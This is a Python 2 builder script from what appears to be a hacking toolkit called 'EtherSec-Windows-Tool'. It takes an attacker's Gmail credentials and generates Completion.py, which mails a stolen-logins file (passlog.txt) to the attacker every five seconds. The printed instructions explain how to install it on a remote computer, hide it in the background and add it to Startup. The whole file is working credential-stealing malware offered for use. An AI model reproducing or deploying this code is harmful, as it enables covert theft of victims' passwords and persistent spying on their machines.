import time
print " [*] Loading..."
time.sleep(4)
import subprocess
subprocess.call("cls", shell=True)
print "----------------------------------------- Welcome to the EtherSec-Windows-Tool -----------------------------------------"
print "\r\n"
print " [*] Welcome to Login Server Builder when entering the"
print '     email and password for the script put quotations around the'
print '     email and password IE:"example@example.com","example123"'
print "\n"
email = raw_input('email(with quotations) :')
password = raw_input('password(with quotations) :')
print "\n"
print " [*] Your Built Server is located as \Completion.py in the \EtherSec-Windows-Tool-master folder"
print "\n"
print " [*] To Install the Server Automatically drag the Compltetion.py"
print "     file to \LoginServer\Setup, once you've completed those steps"
print "     your Login Server will be complete in the LoginServer Folder"
print "     to install to remote computer simply run the installation & Run.bat"
print "     it will install the python programming language and modules needed"
print "     for script and automatically Run in background and add the Startup"
print "     folder, Happy Hacking ~NSP"
print "\n"
subprocess.call("pause", shell=True)
subprocess.call("cls", shell=True)
subprocess.call("EtherSec.py", shell=True)

def main():
     f= open("Completion.py","w+")
     #f=open("Completion.py","a+")
     for i in range(1):
         f.write("import smtplib\r\n")
         f.write("from email.MIMEMultipart import MIMEMultipart\r\n")
         f.write("from email.MIMEBase import MIMEBase\r\n")
         f.write("from email.MIMEText import MIMEText\r\n")
         f.write("from email import Encoders\r\n")
         f.write("import os\r\n")
         f.write("import time\r\n")
         f.write("email = "+email +"\r\n")
         f.write("password = "+password +"\r\n")
         f.write("def mail(to, subject, text, attach):\r\n")
         f.write("   msg = MIMEMultipart()\r\n")
         f.write("   msg['From'] = email\r\n")
         f.write("   msg['To'] = email\r\n")
         f.write("   msg['Subject'] = subject\r\n")
         f.write("   msg.attach(MIMEText(text))\r\n")
         f.write("   part = MIMEBase('application', 'octet-stream')\r\n")
         f.write("   part.set_payload(open(attach, 'rb').read())\r\n")
         f.write("   Encoders.encode_base64(part)\r\n")
         f.write("   part.add_header('Content-Disposition',\r\n")
         f.write("           'attachment; filename=`%s`' % os.path.basename(attach))\r\n")
         f.write("   msg.attach(part)\r\n")
         f.write("   mailServer = smtplib.SMTP('smtp.gmail.com', 587)\r\n")
         f.write("   mailServer.ehlo()\r\n")
         f.write("   mailServer.starttls()\r\n")
         f.write("   mailServer.ehlo()\r\n")
         f.write("   mailServer.login(email, password)\r\n")
         f.write("   mailServer.sendmail(email,email, msg.as_string())\r\n")
         f.write("   mailServer.close()\r\n")
         f.write("def main():\r\n")
         f.write("      while True:\r\n")
         f.write("         mail('some.person@some.address.com',\r\n")
         f.write("         'Heres His Logins ~NSP',\r\n")
         f.write("         'No one can run from EtherElite XD',\r\n")
         f.write("         'passlog.txt')\r\n")
         f.write("         time.sleep(5)\r\n")
         f.write("if __name__=='__main__':\r\n")
         f.write("   main()\r\n")
         
     f.close()   
main()
